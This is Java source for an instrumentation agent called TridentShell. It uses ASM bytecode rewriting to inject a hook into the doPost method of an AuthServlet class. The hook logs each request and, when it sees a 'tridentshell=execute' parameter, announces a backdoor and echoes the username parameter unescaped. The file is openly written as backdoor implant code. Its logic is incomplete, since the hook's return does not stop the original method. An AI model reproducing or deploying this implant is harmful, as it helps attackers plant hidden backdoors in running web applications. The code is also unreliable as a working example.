package com.tridentshell.agent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;
import org.objectweb.asm.*;
import org.objectweb.asm.commons.AdviceAdapter;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import java.io.IOException;

public class TridentShellAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new TridentShellTransformer());
    }

    public static void agentmain(String agentArgs, Instrumentation inst) {
        inst.addTransformer(new TridentShellTransformer());
    }

    public static void interceptRequest(HttpServletRequest request, HttpServletResponse response) {
        try {
            System.out.println("TridentShell: Intercepted request: " + request.getRequestURI());
            String backdoorParam = request.getParameter("tridentshell");
            if ("execute".equals(backdoorParam)) {
                response.getWriter().write("TridentShell Backdoor Activated! Username: " + request.getParameter("username"));
                return;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class TridentShellTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        if (className != null && className.equals("AuthServlet")) {
            try {
                ClassReader cr = new ClassReader(classfileBuffer);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);
                AuthServletClassAdapter adapter = new AuthServletClassAdapter(cw);
                cr.accept(adapter, 0);
                return cw.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return classfileBuffer;
    }
}

class AuthServletClassAdapter extends ClassVisitor {
    public AuthServletClassAdapter(ClassVisitor cv) {
        super(Opcodes.ASM9, cv);
    }

    @Override
    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
        MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
        if ("doPost".equals(name) && "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)V".equals(descriptor)) {
            return new AuthServletMethodAdapter(mv, access, name, descriptor);
        }
        return mv;
    }
}

class AuthServletMethodAdapter extends AdviceAdapter {
    protected AuthServletMethodAdapter(MethodVisitor mv, int access, String name, String descriptor) {
        super(Opcodes.ASM9, mv, access, name, descriptor);
    }

    @Override
    protected void onMethodEnter() {
        mv.visitVarInsn(ALOAD, 1);
        mv.visitTypeInsn(CHECKCAST, "jakarta/servlet/http/HttpServletRequest");
        mv.visitVarInsn(ALOAD, 2);
        mv.visitTypeInsn(CHECKCAST, "jakarta/servlet/http/HttpServletResponse");
        mv.visitMethodInsn(INVOKESTATIC, "com/tridentshell/agent/TridentShellAgent", "interceptRequest",
                           "(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)V", false);
    }
}